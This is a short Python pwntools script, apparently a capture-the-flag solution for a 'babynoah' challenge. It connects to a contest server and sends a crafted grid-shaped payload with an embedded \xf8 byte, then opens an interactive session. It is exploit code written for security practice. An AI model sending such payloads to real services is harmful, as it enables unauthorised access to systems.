from pwn import *



#r = remote("127.0.0.1", 49163)
r = remote("babynoah.bctf23-codelab.kctf.cloud", 1337)

r.recvuntil(b"voyage:")

payload = [
   #   012345678901234567890123
     b">0#!gv>>>>>v            ",
  b"\xf8    >|-!0<<            ",
     b"      5                 ",
     b"      @                 ",
     b"                        ",
     b"                        ",
     b"                        ",
     b"                        ",
]

payload = b"\n".join(payload)

r.sendline(payload)

r.interactive()
